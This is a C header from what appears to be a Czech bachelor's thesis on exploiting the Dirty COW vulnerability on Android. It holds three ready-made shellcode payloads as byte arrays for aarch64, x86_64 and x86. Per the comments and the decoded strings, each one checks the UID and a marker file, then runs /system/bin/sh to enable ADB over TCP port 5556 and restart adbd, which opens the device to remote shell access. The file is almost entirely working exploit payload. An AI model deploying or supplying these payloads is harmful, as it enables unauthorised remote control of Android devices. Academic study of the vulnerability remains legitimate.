/*
 * Tento soubor je soucast bakalarske prace Aplikace vyuzivajici zranitelnost Dirty Cow pro operacni system Android
 * Autor: Vit Soucek (soucevi1@fit.cvut.cz)
 */

#ifndef DIRTYCOW_PAYLOADS_H
#define DIRTYCOW_PAYLOADS_H
#endif

/*
 * Payload ulozi registry, zkontroluje UID, existenci /data/local/tmp/.x
 *  a zavola setprop persist.adb.tcp.port 5556, service adb.tcp.port 5556 a start adbd
 *
 * Vysledek prikazu
 *      aarch64-linux-gnu-as -o payload_aarch64.o payload_aarch64.asm
 *      aarch64-linux-gnu-objcopy -O binary payload_aarch64.o payload_aarch64.bin
 *      xxd -i payload_aarch64.bin
 */
unsigned char payload_aarch64[] = {
        0xe0, 0x07, 0xbf, 0xa9, 0xc8, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4,
        0x80, 0x03, 0x00, 0x35, 0x00, 0x00, 0x80, 0xd2, 0x01, 0x04, 0x00, 0x10,
        0x02, 0x18, 0x80, 0x52, 0x03, 0x38, 0x80, 0x52, 0x08, 0x07, 0x80, 0xd2,
        0x01, 0x00, 0x00, 0xd4, 0x1f, 0x04, 0x40, 0xb1, 0x88, 0x02, 0x00, 0x54,
        0x20, 0x02, 0x80, 0xd2, 0x01, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2,
        0x03, 0x00, 0x80, 0xd2, 0x04, 0x00, 0x80, 0xd2, 0x88, 0x1b, 0x80, 0xd2,
        0x01, 0x00, 0x00, 0xd4, 0x80, 0x01, 0x00, 0x35, 0x01, 0x00, 0x80, 0xd2,
        0xa2, 0x03, 0x00, 0x30, 0xe2, 0x07, 0xbf, 0xa9, 0x41, 0x03, 0x00, 0x50,
        0xa2, 0x02, 0x00, 0x70, 0xe2, 0x07, 0xbf, 0xa9, 0x00, 0x02, 0x00, 0x10,
        0xe1, 0x03, 0x00, 0x91, 0x02, 0x00, 0x80, 0xd2, 0xa8, 0x1b, 0x80, 0xd2,
        0x01, 0x00, 0x00, 0xd4, 0xe0, 0x07, 0xc1, 0xa8, 0xf1, 0x03, 0x1e, 0xaa,
        0xfe, 0x03, 0x10, 0xaa, 0x1f, 0x20, 0x03, 0xd5, 0x1f, 0x20, 0x03, 0xd5,
        0x20, 0x02, 0x1f, 0xd6, 0x2f, 0x64, 0x61, 0x74, 0x61, 0x2f, 0x6c, 0x6f,
        0x63, 0x61, 0x6c, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x2e, 0x78, 0x00, 0x00,
        0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
        0x73, 0x68, 0x00, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62,
        0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x2d, 0x63, 0x00, 0x2f, 0x73, 0x79,
        0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x65, 0x74,
        0x70, 0x72, 0x6f, 0x70, 0x20, 0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74,
        0x2e, 0x61, 0x64, 0x62, 0x2e, 0x74, 0x63, 0x70, 0x2e, 0x70, 0x6f, 0x72,
        0x74, 0x20, 0x35, 0x35, 0x35, 0x36, 0x3b, 0x20, 0x2f, 0x73, 0x79, 0x73,
        0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x65, 0x74, 0x70,
        0x72, 0x6f, 0x70, 0x20, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2e,
        0x61, 0x64, 0x62, 0x2e, 0x74, 0x63, 0x70, 0x2e, 0x70, 0x6f, 0x72, 0x74,
        0x20, 0x35, 0x35, 0x35, 0x36, 0x3b, 0x20, 0x2f, 0x73, 0x79, 0x73, 0x74,
        0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x74, 0x61, 0x72, 0x74,
        0x20, 0x61, 0x64, 0x62, 0x64, 0x00
};
unsigned int payload_aarch64_len = 318;



/*
 * Payload ulozi registry, zkontroluje UID, existenci /data/local/tmp/.x
 *  a zavola setprop persist.adb.tcp.port 5556, service adb.tcp.port 5556 a start adbd
 *
 * Vysledek prikazu
 *      nasm -f bin -o payload_x86_64.bin payload_x86_64.asm
 *      xxd -i payload_x86_64.bin
 */
unsigned char payload_x86_64[] = {
        0x57, 0x56, 0x52, 0x51, 0xb8, 0x66, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
        0x85, 0xc0, 0x75, 0x5d, 0xeb, 0x6e, 0x41, 0x5a, 0xb8, 0x02, 0x00, 0x00,
        0x00, 0x4c, 0x89, 0xd7, 0xbe, 0x02, 0x00, 0x00, 0x00, 0x48, 0x81, 0xce,
        0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0xce, 0x40, 0xba, 0xb6, 0x01, 0x00,
        0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x35, 0xb8, 0x39, 0x00, 0x00,
        0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x75, 0x29, 0x6a, 0x00, 0x4c, 0x89,
        0xd7, 0x48, 0x83, 0xc7, 0x25, 0x57, 0x4c, 0x89, 0xd7, 0x48, 0x83, 0xc7,
        0x22, 0x57, 0x49, 0x83, 0xc2, 0x13, 0x41, 0x52, 0xb8, 0x3b, 0x00, 0x00,
        0x00, 0x4c, 0x89, 0xd7, 0x48, 0x8d, 0x34, 0x24, 0x48, 0x31, 0xd2, 0x0f,
        0x05, 0x59, 0x5a, 0x5e, 0x5f, 0x58, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xff, 0xe0, 0xe8, 0x8d, 0xff, 0xff,
        0xff, 0x2f, 0x64, 0x61, 0x74, 0x61, 0x2f, 0x6c, 0x6f, 0x63, 0x61, 0x6c,
        0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x2e, 0x78, 0x00, 0x2f, 0x73, 0x79, 0x73,
        0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x2d,
        0x63, 0x00, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69,
        0x6e, 0x2f, 0x73, 0x65, 0x74, 0x70, 0x72, 0x6f, 0x70, 0x20, 0x70, 0x65,
        0x72, 0x73, 0x69, 0x73, 0x74, 0x2e, 0x61, 0x64, 0x62, 0x2e, 0x74, 0x63,
        0x70, 0x2e, 0x70, 0x6f, 0x72, 0x74, 0x20, 0x35, 0x35, 0x35, 0x36, 0x3b,
        0x20, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e,
        0x2f, 0x73, 0x65, 0x74, 0x70, 0x72, 0x6f, 0x70, 0x20, 0x73, 0x65, 0x72,
        0x76, 0x69, 0x63, 0x65, 0x2e, 0x61, 0x64, 0x62, 0x2e, 0x74, 0x63, 0x70,
        0x2e, 0x70, 0x6f, 0x72, 0x74, 0x20, 0x35, 0x35, 0x35, 0x36, 0x3b, 0x20,
        0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
        0x73, 0x74, 0x6f, 0x70, 0x20, 0x61, 0x64, 0x62, 0x64, 0x3b, 0x20, 0x2f,
        0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
        0x74, 0x61, 0x72, 0x74, 0x20, 0x61, 0x64, 0x62, 0x64, 0x00
};
unsigned int payload_x86_64_len = 310;





/*
 * Payload ulozi registry, zkontroluje UID, existenci /data/local/tmp/.x
 *  a zavola setprop persist.adb.tcp.port 5556, service adb.tcp.port 5556 a start adbd
 *
 * Vysledek prikazu
 *      nasm -f bin -o payload_x86.bin payload_x86.asm
 *      xxd -i payload_x86.bin
 */
unsigned char payload_x86[] = {
        0x53, 0x51, 0x52, 0x56, 0x57, 0xb8, 0xc7, 0x00, 0x00, 0x00, 0xcd, 0x80,
        0x85, 0xc0, 0x75, 0x51, 0xeb, 0x63, 0x5e, 0xb8, 0x05, 0x00, 0x00, 0x00,
        0x89, 0xf3, 0x81, 0xc3, 0x87, 0x00, 0x00, 0x00, 0xb9, 0x02, 0x00, 0x00,
        0x00, 0x81, 0xc9, 0x80, 0x00, 0x00, 0x00, 0x83, 0xc9, 0x40, 0xba, 0xb6,
        0x01, 0x00, 0x00, 0xcd, 0x80, 0x85, 0xc0, 0x78, 0x28, 0xb8, 0x02, 0x00,
        0x00, 0x00, 0xcd, 0x80, 0x85, 0xc0, 0x75, 0x1d, 0x6a, 0x00, 0x89, 0xf3,
        0x83, 0xc3, 0x12, 0x53, 0x89, 0xf3, 0x83, 0xc3, 0x0f, 0x53, 0x56, 0xb8,
        0x0b, 0x00, 0x00, 0x00, 0x89, 0xf3, 0x8d, 0x0c, 0x24, 0x31, 0xd2, 0xcd,
        0x80, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xff, 0xe0, 0xe8, 0x98, 0xff,
        0xff, 0xff, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69,
        0x6e, 0x2f, 0x73, 0x68, 0x00, 0x2d, 0x63, 0x00, 0x2f, 0x73, 0x79, 0x73,
        0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x65, 0x74, 0x70,
        0x72, 0x6f, 0x70, 0x20, 0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x2e,
        0x61, 0x64, 0x62, 0x2e, 0x74, 0x63, 0x70, 0x2e, 0x70, 0x6f, 0x72, 0x74,
        0x20, 0x35, 0x35, 0x35, 0x36, 0x3b, 0x20, 0x2f, 0x73, 0x79, 0x73, 0x74,
        0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x65, 0x74, 0x70, 0x72,
        0x6f, 0x70, 0x20, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2e, 0x61,
        0x64, 0x62, 0x2e, 0x74, 0x63, 0x70, 0x2e, 0x70, 0x6f, 0x72, 0x74, 0x20,
        0x35, 0x35, 0x35, 0x36, 0x3b, 0x20, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65,
        0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x74, 0x61, 0x72, 0x74, 0x20,
        0x61, 0x64, 0x62, 0x64, 0x00, 0x2f, 0x64, 0x61, 0x74, 0x61, 0x2f, 0x6c,
        0x6f, 0x63, 0x61, 0x6c, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x2e, 0x78, 0x00
};
unsigned int payload_x86_len = 276;